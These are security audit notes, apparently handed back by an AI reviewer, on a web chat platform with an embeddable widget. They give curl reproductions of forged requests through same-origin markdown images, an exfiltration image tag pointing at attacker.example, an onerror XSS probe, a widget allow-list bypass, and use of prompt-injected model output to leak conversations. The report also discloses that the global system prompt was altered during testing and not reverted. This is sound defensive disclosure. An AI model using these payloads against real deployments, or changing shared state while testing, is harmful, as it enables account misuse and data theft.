# Reviewer notes: frontend, widget, server-rendered pages, edge worker

Commit a2e57b08. Validated with curl against :8000 / :5173 and Chromium 156. Saved by the lead
from the reviewer's hand-back (the reviewer's own file write was refused by the harness).

## Shared state changed by accident (needs maintainer decision)

`GET /api.php?action=promptUpdate&topic=general&tool_files=1` as audit-fe-owner@example.com (level NEW)
wrote to the GLOBAL system prompt `general` (BPROMPTS.BID=1, BOWNERID=0). BPROMPTMETA rows on prompt 1
are now: 729 aiModel=-1, 730 tool_mcp=1, 731 tool_files=1 (all BCREATED=1795416740). `tool_mcp=1`
existed before (re-created by the merge); `aiModel=-1` is the loader default; `tool_files=1` is the
added value (unknown whether a tool_files row existed before). Not reverted.
Likely revert: `DELETE FROM BPROMPTMETA WHERE BID IN (729,731);`

## F1 High, Confirmed: on-site request forgery via same-origin markdown image

- `frontend/src/composables/useMarkdown.ts:84-118` `isTrustedImageSrc` accepts any same-origin path
  (explicitly `/api/...`, L98); rendered as `<img src>` at :172-182.
- Viewers: `WidgetSessionsView.vue:601-608, 2247`, `ChatMessage.vue:405`, `SharedChatView.vue:219`,
  `KnowledgeSources.vue:98`, `TaskCard.vue:505`, `ResearchDraft.vue:15`.
- `backend/src/Controller/StreamController.php:48` `/stream` methods GET+POST; handler L236-260; GET
  starts a turn from query params (message, chatId, agentId, webSearch, fileIds, promptTopic), cookie auth.
- `backend/src/Controller/LegacyApiController.php:53-86` `/api.php` GET|POST; `collectLegacyPayload`
  L644-656 merges query+body: promptUpdate (L406), saveWidget (L382), createApiKey (L357) write on GET.
- `AuthCookieFactory.php:43-54` SameSite Strict (prod) / Lax (else): no help, request is same-origin.

Reproduction (own test account):
1. Owner audit-fe-owner@example.com, chat 4699, widget `wdg_d9af0f7906363eefb07ef6ea6bd600aa`.
2. `curl -b jar -H 'Sec-Fetch-Dest: image' 'http://localhost:8000/api/v1/messages/stream?chatId=4699&message=AUDITFE-GET-MARKER-1'`
   -> 200 text/event-stream; message stored in chat 4699.
3. Anonymous visitor: `POST /api/v1/widget/wdg_d9af.../message`, `Origin: https://shop.auditfe.example`,
   body `{"sessionId":"sess_auditfe...","text":"hi ![x](/api/v1/messages/stream?chatId=4699&message=AUDITFE-VISITOR-MARKER-3)"}`
   -> completes, returns chatId 4706.
4. Owner opens `/channels/widgets/wdg_d9af.../chats`, clicks the conversation. DOM contains
   `<img src="/api/v1/messages/stream?chatId=4699&message=AUDITFE-VISITOR-MARKER-3">`; chat 4699 gained
   that IN message plus a reply. Owner typed nothing.
5. `/api.php?action=promptUpdate&topic=general&tool_files=1` -> 200 "Prompt updated successfully".
   `?action=createApiKey` -> API_PLAN_REQUIRED for a NEW user (would mint a key on GET for a paid one).

Impact: unauthenticated visitor runs turns with attacker-written prompt in the widget owner's account
(quota, chat writes, agents/web search/files/tools reachable); `/api.php` writes; with F3 the reply can
be exfiltrated. Victim chat id needed for /stream (sequential; widget SSE `complete` returns the
owner-owned session chatId). CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N = 7.1. CWE-352, CWE-650.

Fix: StreamController POST only (remove GET/EventSource caller `frontend/src/services/apiService.ts:425-436`);
LegacyApiController POST only or delete; subscriber refusing cookie-auth requests with
`Sec-Fetch-Dest` not in {empty, document} and unsafe methods on `Sec-Fetch-Site: cross-site`;
`useMarkdown.ts:98` allow only `/api/v1/files/`, same rule for raw-HTML img via DOMPurify
`afterSanitizeAttributes`. Tests: PHPUnit GET -> 405 for both; Vitest render yields no img; Playwright
@ci visitor-message spec asserting no /messages/stream request.
Detection: looks like a normal turn today. Alert on `Sec-Fetch-Dest: image` + session cookie on /api/,
and on any GET to /api/v1/messages/stream once client is POST-only.
Related: embedded widget on a customer site (relative path resolves against the CUSTOMER origin).

## F2 Medium, Confirmed: legacy promptUpdate rewrites global system prompt metadata

`LegacyApiController.php:406-476` -> `PromptRepository.php:191-216` findByTopicAndUser falls back to
ownerId 0 -> `PromptService.php:71-88, 149-181` deletes and re-creates all metadata rows. No owner check.
Done right: `PromptController.php:968/995`, admin checks L408/L538. Any verified account (NEW).
Writes tool_files, tool_internet, aiModel on the system prompt all accounts use. Reachable without an
account through F1. CVSS AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L = 5.4. CWE-639/862.
Fix: require `$prompt->getOwnerId() === $userId` (create override first) or remove the action.
Related: saveWidget and other legacy actions not reviewed.

## F3 Medium, Confirmed: markdown sanitiser passes raw HTML with external img and style

`useMarkdown.ts:218-325`: ALLOWED_TAGS include img, input, div, svg, use; ALLOWED_ATTR include src,
style, id, xlink:href; marked has no html-renderer override. Observed with the app's `render()`:
`<img src="https://attacker.example/x.png?d=SECRET">` survives; fixed-position full-viewport div with
`background:url(...)` and external link survives; `<input type="password">`, `id="app"`,
`<svg><use xlink:href="https://...">` survive. Blocked: script, handlers, javascript:, iframes, forms.
No CSP is sent. Impact: zero-click exfil of conversation content from prompt-injected output; fake
sign-in overlay (also over a customer page in the widget); tracking.
CVSS AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1. CWE-79 (HTML injection), CWE-1021, CWE-200.
Fix: DOMPurify hook dropping untrusted IMG src; INPUT only disabled checkboxes; drop `style` except
KaTeX output; drop id and xlink:href. Related: all render() callers; `sanitizeMermaidSvg`
(`useMarkdownMermaid.ts:33-40`).

## F4 Low, Confirmed: widget domain allow-list bypass

`WidgetDomainGuard.php:69-101` prefers client `x-widget-host` over Origin/Referer; nelmio_cors allows
that header; `:126-165` matches `*.example.com` with `str_ends_with($host,'example.com')` (no dot).
Sibling: `WidgetLegacyController.php:262+`. With allow-list `["*.auditfe-allowed.example","shop.auditfe.example"]`:
Origin evil.example -> 403; Origin evilauditfe-allowed.example -> 200; Origin evil.example +
X-Widget-Host shop.auditfe.example -> 200. CVSS 5.3. CWE-346, CWE-185.

## F5 Low, Confirmed (reading): session token handed to JS and sent in URLs

`AuthController.php:1157-1187` GET /api/v1/auth/token; `QueryTokenAuthenticator.php:31-67` `?token=`
on ^/api; callers `apiService.ts:425-436`, `usageApi.ts:160-180`, `services/api/mediaAuth.ts`.
CVSS 3.1. CWE-598.

## F6 Low, Suspected: badge placeholders rewritten on HTML string after sanitising

`MessageText.vue:577-600`, `postProcessHtml` L807-820, badge markup L494, `escapeHtmlForBadge` L480-484
does not escape quotes. `title="[Memory:1]<img src=x onerror=alert(1)>"`: Chromium 156 entity-encodes
`<`/`>` in attributes so not exploitable there; needs an older engine/WebView to confirm. CWE-79.

## F7 Low, Suspected: artifact preview CSP inserted by regex

`frontend/src/utils/chatArtifacts.ts:52-57` (`/<head[^>]*>/i` can match inside a comment or `<header>`),
`ArtifactPanel.vue:54-58` sandbox="allow-scripts" srcdoc. Sandbox still isolates the app. CWE-693.

## Ruled out

Script execution via main chat render path (DOMPurify + link scheme checks `useMarkdown.ts:58-64`,
morphdom `MessageText.vue:92-116`); KaTeX trust:false (`useMarkdownKatex.ts:50-56`); Mermaid strict
(`useMarkdownMermaid.ts:55`); DocRefPill; code blocks (`MessageCode.vue:84-96`); FeedbackView
(:532-542); widget print export (`ChatWidget.vue:1396-1416`); widget config sinks (`widget.ts:279-281`,
`WidgetService.php:376-381`, `WidgetPublicController.php:289-296`, `WidgetLegacyController.php:119-124,153`);
PluginView; shared chat page (`SharedChatPageController.php:449-452`); human-check page
(`HumanCheckPage.php:44-69,145-156`, `useSignupChallenge.ts:256-257`); synascriber silent page
(`JitsiController.php:114-152`, `loader.js:155-170`); clickjacking (X-Frame-Options SAMEORIGIN,
`_docker/backend/Caddyfile:41-55`); uploads (`UploadedFileSandboxSubscriber.php:28-70`,
`FileServeController.php:56-180`, `StaticUploadController.php:300-335`); message export
(`MessageExportController.php:82`); cookies (`AuthCookieFactory.php:43-54`); credentialed CORS (no
allow_credentials); open redirects (`LoginView.vue:603-620`, `OutlookConnectService.php:101-109`);
cloudflare worker; email templates (no |raw).

## Hardening

No CSP anywhere; `_docker/backend/Caddyfile:72-78` immutable cache header by extension applied to PHP
routes (cache deception risk; observed on /api/v1/files/uploads/x/y.png, /shared/abc.js); HSTS only in
`deploy/aws/caddy/Caddyfile.domain:24`; nelmio_cors reflects every origin on every path; CSRF rests on
SameSite alone (Lax outside prod); dynamic :href without scheme check (MessageLinks.vue, MessageLink.vue,
MessageScreenshot.vue, ChatWidget.vue:220-221); JitsiController JSON without JSON_HEX_TAG;
X-Powered-By / X-Synaplan-Server version disclosure; DOMPurify allows id; legacy messageNew 500 in dev.

## Coverage gaps

Marketeer pages (not in checkout); OAuth consent logic; other GET routes screened by name only;
:href sources; other plugins' front ends, frontend-widgets service, built widget bundle; Capacitor
shells; Firefox/Safari; F7 dynamic; CSRF content-type per endpoint; Centrifugo render path; prod
Caddy/Cloudflare from config only.

Test objects left: user audit-fe-owner@example.com (id 4923), chat 4699, widget id 588, chat 4706.
